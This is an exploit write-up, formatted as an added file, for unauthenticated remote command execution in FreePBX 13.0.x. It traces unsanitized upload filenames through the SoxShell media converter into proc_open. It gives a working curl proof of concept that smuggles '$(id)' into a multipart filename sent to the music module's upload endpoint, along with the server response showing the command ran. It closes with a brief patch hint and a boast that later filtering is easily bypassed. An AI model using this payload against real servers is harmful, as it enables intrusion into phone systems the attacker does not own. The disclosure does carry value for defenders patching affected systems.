@@ -1,0 +1,122 @@
+Vulnerable software : Freepbx
+Tested versions : 13.0.x < 13.0.154
+vendor : freepbx.org
+Author : i-Hmx
+Email : n0p1337@gmail.com
+Home : sec4ever.com
+
+Knock knock people , Eg-R1z on the mic again . .
+Freepbx is vulnerable to unauthenticated remote command execution due to multiple weak inputs validation as well as partial authenticaion bypass
+Need more technical shit?!
+Here u go
+
+File : /var/www/html/admin/libraries/Composer/vendor/symfony/process/Symfony/Component/Process/Process.php
+class Process
+{
+    const ERR = 'err';
+    const OUT = 'out';
+
+    const STATUS_READY = 'ready';
+    const STATUS_STARTED = 'started';
+    const STATUS_TERMINATED = 'terminated';
+
+Line 145:
+       public function __construct($commandline, $cwd = null, array $env = null, $input = null, $timeout = 60, array $options = array())
+    {
+        if (!function_exists('proc_open')) {
+            throw new RuntimeException('The Process class relies on proc_open, which is not available on your PHP installation.');
+        }
+
+        --===>>> $this->commandline = $commandline;
+        $this->cwd = $cwd;
+
+   
+Line 275
+        $commandline = $this->commandline;
+
+        if ('\\' === DIRECTORY_SEPARATOR && $this->enhanceWindowsCompatibility) {
+            $commandline = 'cmd /V:ON /E:ON /C "('.$commandline.')';
+            foreach ($this->processPipes->getFiles() as $offset => $filename) {
+                $commandline .= ' '.$offset.'>'.ProcessUtils::escapeArgument($filename);
+            }
+            $commandline .= '"';
+
+            if (!isset($this->options['bypass_shell'])) {
+                $this->options['bypass_shell'] = true;
+            }
+        }
+
+        --===>>> $this->process = proc_open($commandline, $descriptors, $this->processPipes->pipes, $this->cwd, $this->env, $this->options);
+
+Class is being called at
+
+File : /var/www/html/admin/libraries/media/Media/Driver/Drivers/SoxShell.php
+Line 118
+    public function convert($newFilename,$extension,$mime) {
+        switch($extension) {
+            case "wav":
+                switch($this->extension) {
+                    case "sln":
+                        $process = new Process($this->binary.' -t raw -s -b 16 -r 8000 '.$this->track.' -r '.$this->options['samplerate'].' -b '.$this->options['bitdepth'].' -c 1 '.$newFilename);
+                    break;
+                    case "sln12":
+                        $process = new Proces.................
+        case "wav16":
+                ---===>> $process = new Process($this->binary.' '.$this->track.' -t wav -b 16 -r 16000 -c 1 '.$newFilename);
+            break;
+            default:
+                $process = new Process($this->binary.' '.$this->track.' -c 1 '.$newFilename);
+            break;
+        }
+        if(!$this->background) {
+            ---===>> $process->run();
+            if (!$process->isSuccessful()) {
+                throw new \RuntimeException($process->getErrorOutput());
+            }
+        } else {
+            $process->start();
+            if (!$process->isRunning()) {
+                throw new \RuntimeException($process->getErrorOutput());
+            }
+        }
+    }
+
+Sox shell can be called via multiple parts of the fpbx including the music module
+File : admin/modules/music/Music.class.php
+Line : 407
+                                $name = $dname . '.' . $extension;
+                                move_uploaded_file($tmp_name, $this->tmp."/".$name);
+                                $media->load($this->tmp."/".$name);
+                                foreach($_POST['codec'] as $c) {
+                            --==>> $media->convert($path."/".$dname.".".$c);
+                                }
+                                unlink($this->tmp."/".$name);
+
+this part can be accessed by unauthenticated user and so it's obvious command execution vulnerable :/
+
+POC :
+[root:/lab/fpbx]# curl -i -s -k  -X 'POST' \
+    -H 'User-Agent: sec4ever 1337s' -H 'Referer: http://x.x.x.x/admin/ajax.php' -H 'Content-Type: multipart/form-data; boundary=---------------------------317092200613369' \
+    --data-binary $'-----------------------------317092200613369\x0d\x0aContent-Disposition: form-data; name=\"extension\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------317092200613369\x0d\x0aContent-Disposition: form-data; name=\"language\"\x0d\x0a\x0d\x0aen\x0d\x0a-----------------------------317092200613369\x0d\x0aContent-Disposition: form-data; name=\"filename\"\x0d\x0a\x0d\x0afa.wav\x0d\x0a-----------------------------317092200613369\x0d\x0aContent-Disposition: form-data; name=\"codec[1]\"\x0d\x0a\x0d\x0agsm\x0d\x0a-----------------------------317092200613369\x0d\x0aContent-Disposition: form-data; name=\"id\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------317092200613369\x0d\x0aContent-Disposition: form-data; name=\"files[1]\"; filename=\"$(id).wav\"\x0d\x0aContent-Type: text/plain\x0d\x0a\x0d\x0aEg-R1z ruling you ;)\x0d\x0a-----------------------------317092200613369\x0d\x0a\x0d\x0a' \
+    'http://x.x.x.x/admin/ajax.php?module=music&command=upload'
+HTTP/1.1 500 Internal Server Error
+Date: Wed, 07 Sep 2016 17:33:02 GMT
+Server: Apache/2.2.15 (CentOS)
+X-Powered-By: PHP/5.3.28
+Set-Cookie: lang=en_US
+Set-Cookie: PHPSESSID=6j9ei3pn1btu2o6jc1j6mngmp4; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+X-Ignore-This: 1
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: application/json
+
+{"error":{"type":"RuntimeException","message":"\/usr\/bin\/sox formats: can't open input file `groups=498(asterisk).wav': No such file or directory\n","file":"\/var\/www\/html\/admin\/libraries\/media\/Media\/Driver\/Drivers\/SoxShell.php","line":194}}#                   
+
+Patching : can be done via adding escapeshellarg to soxshell inputs
+Almost fixed in fpbx later versions
+# in this version spaces,',`,/,\,<,>,?,&,| are filtered , which can be super easily bypassed
+# make a priv8 , burn another ;)
+# From Eg-R1z with Love xD
